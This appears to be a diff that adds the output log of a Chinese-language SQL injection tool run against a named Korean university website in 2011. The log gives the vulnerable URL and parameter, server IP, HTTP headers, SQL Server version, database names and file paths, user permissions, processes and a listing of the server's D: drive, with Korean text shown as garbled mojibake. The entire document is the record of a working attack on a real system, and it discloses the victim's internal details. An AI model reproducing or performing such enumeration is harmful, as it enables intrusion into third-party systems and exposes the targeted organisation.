@@ -1,0 +1,105 @@
+■漏洞信息:============================================================
+ ·URL:http://www.dufs.ac.kr/new08/board/bo_hitcnt.asp?page=1&pagekind=bo_view&id=113
+ ·页面标题：;;;措备寇惫绢措切;;;
+ ·参数:page=1&pagekind=bo_view&id=113
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:220.88.242.194
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 302 Object moved
+Connection: close
+Date: Mon, 04 Apr 2011 05:34:53 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Location: ../bo_index.asp?pagekind=bo_view&page=1&id=113
+Content-Length: 175
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAQQRQQDQ=CKLHCGEAFLPIKFOIOPPOCEFP; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：daegu
+- 用户名：dufs
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NS
+- 服务名：MSSQLSERVER
+- 系统用户名：dufs
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+daegu	D:\database\daegu_Data.MDF	
+dufs_haksa	D:\database\dufs_haksa_Data.MDF	
+haksa01	D:\database\haksa01_Data.MDF	
+insa	D:\database\insa_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+sn1	D:\database\sn1_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	NS	1968	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	NS	1968	AWAITING COMMAND	SYSTEM	
+SM2007	sleeping	USER-11	3964	AWAITING COMMAND		
+SM2007	sleeping	USER-11	3964	AWAITING COMMAND		
+SM2007	sleeping	USER-11	3964	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+NS	SQL Server	SQLOLEDB	NS		NS	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+切荤辆钦\
+切荤FTP\
+backup\
+database\
+ftproot\
+iboard\
+New_Homepage\
+RECYCLER\
+System Volume Information\
+tools\
+ALZ3.tmp
+C_傈眉归诀.bkf
+gnuboard4.zip
+iboard(2).zip
+iboard.zip
+MegaDoctorSetup.exe
+
